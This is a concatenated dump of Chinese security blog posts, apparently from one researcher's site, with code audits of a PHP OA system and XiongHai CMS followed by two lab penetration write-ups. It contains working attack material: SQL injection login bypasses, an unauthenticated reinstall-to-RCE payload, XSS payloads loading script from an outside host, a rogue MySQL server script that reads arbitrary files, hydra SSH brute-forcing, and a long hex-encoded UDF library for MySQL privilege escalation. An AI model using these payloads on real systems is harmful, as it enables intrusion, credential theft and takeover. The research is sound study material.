前台由于是个OA，因此其实前台功能不多比如登陆、安装等基本上就无了不像我们的内容管理系统，这个更偏向于办公 登陆页SQL注入这里简单测试万能密码就行了，其他的盲注之类的原理差不多，可以看见这里直接对参数进行拼接因此有sql注入的风险，这里的逻辑是先在数据库当中查出一条数据，再拿出密码去比对 简单测试万能密码，其他的注入脱裤啥的就不测了，没必要，主要是这里是盲注我懒得去写脚本 但是这里有一个问题，我们看进入了后台以后发现不是admin，再回到代码我们可以看到这里其实是id控制的，因此我们将union 第二个参数修改为admin对应的id即可，这里默认安装的时候设置的为1 因此简单修改payload 1adminuser=0&#x27; union select &#x27;e10adc3949ba59abbe56e057f20f883e&#x27;,1,3,&#x27;admin&#x27;,5%23&amp;adminpass=123456&amp;rempass=0&amp;button=1&amp;jmpass=false 前台RCE/文件读取这个版本很逗，有个逻辑漏洞导致可以重装再RCE，首先我们知道对于Ajax的请求也就是要求ajaxbool参数为true，而如果为true则必须要进行登陆，可能是因为这些请求都属于后台功能 12345678if($islogin == 0)&#123; if($ajaxbool == &#x27;true&#x27;)&#123; echo &#x27;sorry! not sign&#x27;; &#125;else&#123; $rock-&gt;location(&#x27;?m=login&#x27;); &#125; exit();&#125; 但是这里又很逗，咋说呢，来看看islogin是如何赋值的，因为这里是逻辑或所以只要满足任意条件就能登陆 1if($mode==&#x27;login&#x27; || $dir==&#x27;taskrun&#x27; || $mode==&#x27;taskrun&#x27; || $mode==&#x27;install&#x27;)$islogin = 1;//不可删除 因此我们完全可以控制m=install进入重装，最搞笑的是这里不像其他系统会首先判断是否已安装，这里就是可以随意重新安装无语子，而且最后他会把配置信息拼接写入一个php文件造成了前台的RCE 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?php class installClassAction extends Action&#123; public function initMysql() &#123; $this-&gt;linkdb = false; &#125; public function defaultAction() &#123; $this-&gt;title = TITLE.&#x27;_安装&#x27;; &#125; public function saveAjax() &#123; $host = $this-&gt;post(&#x27;host&#x27;); $user = $this-&gt;post(&#x27;user&#x27;); $pass = $this-&gt;post(&#x27;pass&#x27;); $base = $this-&gt;post(&#x27;base&#x27;); $perfix = $this-&gt;post(&#x27;perfix&#x27;); $title = $this-&gt;post(&#x27;title&#x27;); $qom = $this-&gt;post(&#x27;qom&#x27;); $url = $this-&gt;post(&#x27;url&#x27;); $highpass = $this-&gt;post(&#x27;highpass&#x27;); $msg = &#x27;&#x27;; if($this-&gt;isempt($msg))&#123; @$conn=mysql_connect($host,$user,$pass); $msg = mysql_error(); &#125; if(!$this-&gt;isempt($msg))&#123; $msg = &#x27;无法连接数据库密码/用户名有误&#x27;; &#125; if($this-&gt;isempt($msg))&#123; @mysql_select_db($base, $conn); $msg = mysql_error(); //数据库不存在就创建 if(!$this-&gt;isempt($msg))&#123; @mysql_query(&quot;CREATE DATABASE `$base` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci&quot;); $msg = mysql_error(); if($this-&gt;isempt($msg))&#123; @mysql_select_db($base, $conn); $msg = mysql_error(); &#125; &#125; if(!$this-&gt;isempt($msg))&#123; $msg = &#x27;&#x27;.$base.&#x27;数据库名不存在/不能创建&#x27;; &#125; &#125; if($this-&gt;isempt($msg))&#123; mysql_query(&quot;SET NAMES &#x27;utf8&#x27;&quot;); $dburl = ROOT_PATH.&#x27;/rainrock.sql&#x27;; if(!file_exists($dburl))$msg = &#x27;数据库sql文件不存在&#x27;; &#125; if($this-&gt;isempt($msg))&#123; $sqlss = file_get_contents($dburl); $a = explode(&quot;;&quot;, $sqlss); for($i=0; $i&lt;count($a)-1; $i++)&#123; $sql = $a[$i]; $sql = str_replace(&#x27;`rock_&#x27;, &#x27;`&#x27;.$perfix.&#x27;&#x27;, $sql); //前缀替换 $bo = mysql_query($sql, $conn); if(!$bo)&#123; $msg = &#x27;导入文件失败&#x27;; break; &#125; &#125; &#125; if($this-&gt;isempt($msg))&#123; mysql_query(&quot;update `&quot;.$perfix.&quot;option` set `value`=&#x27;$title&#x27; where `num`=&#x27;systemtitle&#x27;&quot;);//系统标题 $txt = &quot;&lt;?phpreturn array( &#x27;url&#x27; =&gt; &#x27;$url&#x27;, //系统URL &#x27;title&#x27; =&gt; &#x27;$title&#x27;, //系统默认标题 &#x27;db_host&#x27; =&gt; &#x27;$host&#x27;, //数据库地址 &#x27;db_user&#x27; =&gt; &#x27;$user&#x27;, //用户名 &#x27;db_pass&#x27; =&gt; &#x27;$pass&#x27;, //密码 &#x27;db_base&#x27; =&gt; &#x27;$base&#x27;, //数据库名称 &#x27;perfix&#x27; =&gt; &#x27;$perfix&#x27;, //表名前缀 &#x27;qom&#x27; =&gt; &#x27;$qom&#x27;, //session、cookie前缀 &#x27;highpass&#x27; =&gt; &#x27;$highpass&#x27;, //超级管理员密码，可用于登录任何帐号 &#x27;install&#x27; =&gt; true //已安装，不要去掉啊);&quot;; $this-&gt;rock-&gt;createtxt(&#x27;webrock/webrockConfig.php&#x27;, $txt); &#125; if($this-&gt;isempt($msg))$msg = &#x27;success&#x27;; echo $msg; &#125;&#125; 因此最终可以构造，前提要有个可以连接的服务器不然连接不上就无法执行后面的语句了 123host=xxx:3306&amp;user=admin&amp;pass=admin123&amp;base=ry&amp;perfix=yy_&amp;qom=&#x27;,&quot;123&quot;=&gt;phpinfo(),//http://xxxx/rock.php?a=save&amp;m=install&amp;ajaxbool=true 接下来只需要访问http://xxxx/webrock/webrockConfig.php,其实首页也行毕竟是配置文件肯定全局引入了的 前台XSS因为在路由出现找不到类的时候会直接echo绝对路径等信息，还可以用户控制部分字符那就很容易进行XSS了,这里不上代码了上面分析架构的时候说过 1http://xxxxx/rock.php?a=zz&amp;m=flowz&lt;script&gt;alert(&quot;Hacked By Y4tacker&quot;)&lt;/script&gt;&amp;d=&amp;ajaxbool=true 当然还可以配合rougue mysql server做任意文件读取，这里就不展开了 后台前台功能不多，那现在进入后台，个人也是有洁癖的只喜欢前台洞或者一条从前台到后台的完整利用 现在前台也已经有sql注入了，后台的注入也有很多,数不胜数但是没啥意义了，漏洞原理都是一样的无过滤+参数拼接造成命令逃逸，后台XSS点也很多也是一样没意义了,这里就列举一些不一样的点 后台XXE这里就简单做个POC验证即可，可以看到在webrock/humanres/kaoqin/kaoqinAction.php 看看这个reader其实就是解析Excel的一个功能，这时候不难想到可能存在xxe 在canRead当中，可以看见首先对_rels/.rels做了simplexml_load_string处理，存在xxe，后面我们都不需要伪造完整的excel格式的文件了 这里简单测试一波能接收到url请求的连接就行，之后重命名为.rels即可 简单python发波包 1234567import requestsurl = &quot;http://xxxx/rock.php?a=import&amp;m=kaoqin&amp;d=humanres&amp;ajaxbool=true&quot;r= requests.post(url,files=&#123;&quot;file&quot;:open(&quot;1.zip&quot;,&quot;rb&quot;).read()&#125;)print(r.text)","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Y4教你审计系列之熊海CMS代码审计","slug":"year/2022/6/Y4教你审计系列之熊海CMS代码审计","date":"2022-06-16T01:16:08.000Z","updated":"2024-08-04T09:01:49.463Z","comments":true,"path":"2022/06/16/year/2022/6/Y4教你审计系列之熊海CMS代码审计/","link":"","permalink":"https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"熊海CMS代码审计架构审计代码从架构开始，这个CMS架构比较简单，简单的MVC设计模式，根据参数r决定路由的分发，这个路由分发可能导致一个致命的缺陷导致最终实现RCE 123456&lt;?phperror_reporting(0); $file=addslashes($_GET[&#x27;r&#x27;]); $action=$file==&#x27;&#x27;?&#x27;index&#x27;:$file; include(&#x27;files/&#x27;.$action.&#x27;.php&#x27;);?&gt; 由此可能存在的前台RCE我们知道熊海安装会先判断同文件夹下有无InstallLock.txt作为是否安装的判断标准 那如果我们通过上面这个路由分发实现目录穿越，那当前目录也就是web目录下的index.php是没有这个文件的 没有对参数做处理 1234567$save=$_POST[&#x27;save&#x27;];$user=$_POST[&#x27;user&#x27;];$password=md5($_POST[&#x27;password&#x27;]);$dbhost=$_POST[&#x27;dbhost&#x27;];$dbuser=$_POST[&#x27;dbuser&#x27;];$dbpwd=$_POST[&#x27;dbpwd&#x27;];$dbname=$_POST[&#x27;dbname&#x27;]; 可惜由于有第一行include失败导致代码终止，不然通过这个我们一方面可以尝试fakemysql读取任意文件，另一方面可以实现往web目录上一层写文件之后再包含实现RCE，有点可惜 有没有解决的办法呢？有那就是找一个和install/index.php相对路径相同的并且存在如上代码的地方，有么 答案是有，我们可以通过此路由成功保留install的所有功能 前台配合目录穿越读文件可以看见mysql成功建立连接 但是毕竟admin目录下没有sql文件，如果能配合文件上传也能搞事情待会儿研究下 不过这时候可以做一件事情，通过fakemysql去读任意文件了，也是存在的点，这里由于php版本不一致需要构造不同的tcp数据包，这里我用了github上找到的一个和我php5.2版本能用的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpfunction unhex($str) &#123; return pack(&quot;H*&quot;, preg_replace(&#x27;#[^a-f0-9]+#si&#x27;, &#x27;&#x27;, $str)); &#125;$filename = &quot;/etc/passwd&quot;;$srv = stream_socket_server(&quot;tcp://0.0.0.0:1237&quot;);while (true) &#123; echo &quot;Enter filename to get [$filename] &gt; &quot;; $newFilename = rtrim(fgets(STDIN), &quot;\\r\\n&quot;); if (!empty($newFilename)) &#123; $filename = $newFilename; &#125; echo &quot;[.] Waiting for connection on 0.0.0.0:1237\\n&quot;; $s = stream_socket_accept($srv, -1, $peer); echo &quot;[+] Connection from $peer - greet... &quot;; fwrite($s, unhex(&#x27;45 00 00 00 0a 35 2e 31 2e 36 33 2d 30 75 62 75 6e 74 75 30 2e 31 30 2e 30 34 2e 31 00 26 00 00 00 7a 42 7a 60 51 56 3b 64 00 ff f7 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 64 4c 2f 44 47 77 43 2a 43 56 63 72 00 &#x27;)); fread($s, 8192); echo &quot;auth ok... &quot;; fwrite($s, unhex(&#x27;07 00 00 02 00 00 00 02 00 00 00&#x27;)); fread($s, 8192); echo &quot;some shit ok... &quot;; fwrite($s, unhex(&#x27;07 00 00 01 00 00 00 00 00 00 00&#x27;)); fread($s, 8192); echo &quot;want file... &quot;; fwrite($s, chr(strlen($filename) + 1) . &quot;\\x00\\x00\\x01\\xFB&quot; . $filename); stream_socket_shutdown($s, STREAM_SHUT_WR); echo &quot;\\n&quot;; echo &quot;[+] $filename from $peer:\\n&quot;; $len = fread($s, 4); if(!empty($len)) &#123; list (, $len) = unpack(&quot;V&quot;, $len); $len &amp;= 0xffffff; while ($len &gt; 0) &#123; $chunk = fread($s, $len); $len -= strlen($chunk); echo $chunk; &#125; &#125; echo &quot;\\n\\n&quot;; fclose($s);&#125; 简单测试一波成功读取到配置文件 可惜后台也不能任意上传文件到admin的fiels目录下，而且config.json配置当中不支持json后缀，就到此结束吧 真正的前台RCE因为是宝塔安装的缘故所以很容易猜测到宝塔php的安装路径/www/server/php/52/，这里介绍另一个trick的使用也就是pearcmd.php，在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。，这里这个老cms一定是只能5版本所以一定可以 因此构造payload，往/tmp/hello.php写文件即可 之后文件包含成功RCE 逻辑绕过免密码登入后台-垂直越权鉴权函数很简单，所以只要设置cookie当中user为任意字符即可进入后台 前台既然默认是从files文件夹下做为路由的主文件，我们不妨先从files文件夹开始，文件也不多，在每个文件当中先做了一件事情，这部分没啥漏洞，r本来就是决定路由分发的，而且有addslashes无法逃逸单引号，除非能控制数据库内容可以形成xss 1234567891011&lt;?php require &#x27;inc/conn.php&#x27;;require &#x27;inc/time.class.php&#x27;;$query = &quot;SELECT * FROM settings&quot;;$resul = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error());$info = mysql_fetch_array($resul);$llink=addslashes($_GET[&#x27;r&#x27;]);$query = &quot;SELECT * FROM nav WHERE link=&#x27;$llink&#x27;&quot;;$resul = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error());$navs = mysql_fetch_array($resul);?&gt; 前台XSS1+突破addslashes字符限制在contact.php当中，接收到page参数并回显， 123456$page=addslashes($_GET[&#x27;page&#x27;]);if ($page&lt;&gt;&quot;&quot;)&#123;if ($page&lt;&gt;1)&#123;$pages=&quot;第&quot;.$page.&quot;页 - &quot;;&#125;&#125; 因此可以通过payload 11&lt;/a&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;a&gt; 但是这里又有了一个新的问题，addslashes导致我们不能带引号，那怎么办呢？下面给一个解决方式，很简单就不多说啦，这里src可以不加引号 1r=contact&amp;page=2333&lt;/a&gt;&lt;script src=http://xxxx/1.js&gt;&lt;/script&gt;&lt;a&gt; 又或者 1r=contact&amp;page=2333&lt;/a&gt;&lt;script&gt;alert(/Hacked By y4tacker/)&lt;/script&gt;&lt;a&gt; 前台XSS2在content页面，id可控制cookie也可控制不演示了，懂得都懂 前台XSS3-同样例子太多就不列举了这个更离谱，无过滤后面还有输出yema参数同样不演示了，没意义，同样的例子很多 前台SQL注入 content/software两个页面同理由于有addslashes，造成不难逃逸引号 123456789101112131415161718192021&lt;?php require &#x27;inc/conn.php&#x27;;require &#x27;inc/time.class.php&#x27;;$query = &quot;SELECT * FROM settings&quot;;$resul = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error());$info = mysql_fetch_array($resul);$id=addslashes($_GET[&#x27;cid&#x27;]);$query = &quot;SELECT * FROM content WHERE id=&#x27;$id&#x27;&quot;;$resul = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error());$content = mysql_fetch_array($resul);$navid=$content[&#x27;navclass&#x27;];$query = &quot;SELECT * FROM navclass WHERE id=&#x27;$navid&#x27;&quot;;$resul = mysql_query($query) or die(&#x27;SQL语句有误：&#x27;.mysql_error());$navs = mysql_fetch_array($resul);//浏览计数$query = &quot;UPDATE content SET hit = hit+1 WHERE id=$id&quot;;@mysql_query($query) or die(&#x27;修改错误：&#x27;.mysql_error());?&gt; 造成update语句处的注入，当然这里@mysql_query($query) or die(&#39;修改错误：&#39;.mysql_error());会输出错误，所以报错注入就完事啦 有了sql注入，我们就能尝试拿到管理用户密码，在最上面我们说了密码只是简单md5所以可能造成撞库获取明文的风险 验证码逻辑问题可以看到这里验证码引入code.class.php 而这个文件直接把验证码放入session，这里还没啥问题 这里只是验证是否一致，如果一致也不会刷新，所以我们可以通过一个验证码来一直实现爆破需要验证码的页面如登陆等等 前台SQL注入很多参数都没过滤，随便注入了，只是有个限制就是需要验证码 配合上面验证码的逻辑漏洞可以实现随便注入 1cid=0&amp;content=2dsads笑死a333%40&amp;jz=1&amp;mail=&#x27; and extractvalue(0x0a,concat(0x0a,(select+version()))))%23&amp;name=asdas&amp;randcode=5x94&amp;save=提交&amp;tz=1&amp;url=asdsadsa 万能密码进入后台和普通万能密码不一样，它需要查询到数据然后与结果中密码的比对 因此只需要联合查询构造虚假数据即可 123POST数据user=1&#x27; union select 1,2,&#x27;y4tacker&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;,5,6,7,8%23password=1 其中md5(1)=c4ca4238a0b923820dcc509a6f75849b 后台后台SQL注入有很多就不列举出来了没意义，其他的大概看了下后台没有文件上传,内嵌插件也不能上传(白名单的限制无法突破，也没有文件包含就没啥意义了)，除此以外还有个SSRF，但单个系统的SSRF没啥太大价值，除非有其他内网系统才能凸显其价值 一个可行的RCE方案毕竟是熊海CMS，要求是低版本php5，那么如果php版本小于5.2.8，linux 需要文件名长于 4096，windows 需要长于 256，超过部分会被丢弃从而实现文件包含绕过后缀.php限制，这样我们就可以传图片马即可 又或者通过00截断控制后缀，不过也是有限制的，在 php 版本小于 5.3.4 而且GPC = Off 允许使用%00 截断，在使用 include 等文件包含函数，可以截 断文件名，截断会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成\\0 截断会失败。 参考文章https://paper.seebug.org/1112/ https://github.com/Al1ex/Rogue-MySql-Server","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"实训打靶记录(二)","slug":"year/2022/6/实训打靶记录-二","date":"2022-06-14T10:32:52.000Z","updated":"2024-08-04T09:01:49.584Z","comments":true,"path":"2022/06/14/year/2022/6/实训打靶记录-二/","link":"","permalink":"https://y4tacker.github.io/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/","excerpt":"","text":"实训靶机-2信息搜集端口搜集首先通过nmap扫描靶机，发现两个端口22和3000，其中3000是一个web服务 通过dirsearch发现两个可以目录，居然是nodejs的项目 web服务搜集顺便记录下首页出现的三个用户名tomcat、mark、rastating 简单在github上面搜索下最关键的特征词发现没有这个项目 源码泄漏f12发现下面疑似接口泄漏 但是点进去发现原来是故意给了源码啊 用户信息泄漏简单访问一下发现泄漏了用户名和密码 之后发现去掉latest以后还出现了admin admin密码撞库拿到了密码manchester，拿着这个去登陆 admin用户登陆发现登陆后有个下载备份 看了下请求信息，发现是get请求并且无传参，看来无法任意文件下载 获得备份文件直接修改为zip发现打不开 直接打开发现是疑似base64 果然是，然后还发现有密码 爆破密码用archpr发现爆破一年应该不能爆破，尝试下用rockyou字典得到了密码magicword 成功获取源码 数据库配置信息泄漏发现敏感信息泄漏mark:5AYRft73VtFpc84k 登陆ssh按照套路，尝试使用用户mark登陆ssh，登陆成功 whoami发现是普通用户权限 提权尝试寻找特权指令查看有无特权指令 尝试suid提权-pkexec成功尝试suid提权,发现pkexec，联想到前段时间的pkexec本地提权 影响版本 12345678910111213CentOS系列： CentOS 6：polkit-0.96-11.el6_10.2 CentOS 7：polkit-0.112-26.el7_9.1 CentOS 8.0：polkit-0.115-13.el8_5.1 CentOS 8.2：polkit-0.115-11.el8_2.2 CentOS 8.4：polkit-0.115-11.el8_4.2 Ubuntu系列： Ubuntu 20.04 LTS：policykit-1 - 0.105-26ubuntu1.2 Ubuntu 18.04 LTS：policykit-1 - 0.105-20ubuntu0.18.04.6 Ubuntu 16.04 ESM：policykit-1 - 0.105-14.1ubuntu0.5+esm1 Ubuntu 14.04 ESM：policykit-1 - 0.105-4ubuntu3.14.04.6+esm1 发现版本对上了 网上下个pochttps://github.com/berdav/CVE-2021-4034，提权成功 获取交互式shell1python -c &#x27;import pyt;pty.spwan(&quot;/bin/bash&quot;)&#x27; 获取flag一个是在/root/root.txt ; 另一个是在/home/tom/user.txt;","categories":[{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/categories/PTES/"}],"tags":[{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/tags/PTES/"}]},{"title":"实训打靶记录(一)","slug":"year/2022/6/实训打靶记录-一","date":"2022-06-14T10:28:00.000Z","updated":"2024-08-04T09:01:49.500Z","comments":true,"path":"2022/06/14/year/2022/6/实训打靶记录-一/","link":"","permalink":"https://y4tacker.github.io/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/","excerpt":"","text":"实训靶机-1实训期间先搞开发再搞了渗透，现在开始渗透阶段了 信息收集端口扫描发现三个端口，暴露了web服务 用dirsearch进行扫描，发现有vendor目录，里面可能有composer生成的铭感信息 发现配置错误，正好能访问对应文件 获得web目录绝对路径 PHPmailer版本5.2.16 存在漏洞利用点kali里面发现漏洞利用点 存在wordpress站点首页点击BLOG跳转到wordpress页面 wpscan尝试扫描漏洞发现两个用户steven与michael 尝试爆破ssh密码收集到的两个用户进行利用 1hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -F -V 192.168.10.131 ssh 成功得到michael的密码Michael 尝试ssh远程登录 mysql查看mysql是否运行 获取mysql密码在wordpress目录下wp-config.php获得了root用户的密码 12345/** MySQL database username */define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);/** MySQL database password */define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;); 登陆mysql 查看数据库show database 查看wordpress当中的表 查看数据库用户并破解密码 $P$BqfBDRL7nB8b5G0aPRMiL.iSsn5YD00去somd5查询后得到steven密码pink84 ssh登陆steven用户并获取交互式shell1python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; sudo -l通过特权指令提权 提权 第二种方式：phpmailer获取web权限这里用python脚本提权 这里对其修改改为一个php后门，方便后渗透 之后利用这个backdoor.php，获取虚拟终端，发现mysql为root用户运行，如果能通过mysql提权限那么就会获得root用户权限 UDF提权在蚁剑使用mysql连接插件 mysql查询系统相关信息得到mysql版本 获取到系统为64位系统 查看写入权限反正是root，就算无也可以改，发现可以写 1show global variables like &#x27;%secure%&#x27;; 查看mysql插件目录地址 udf一把梭哈 1SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f737973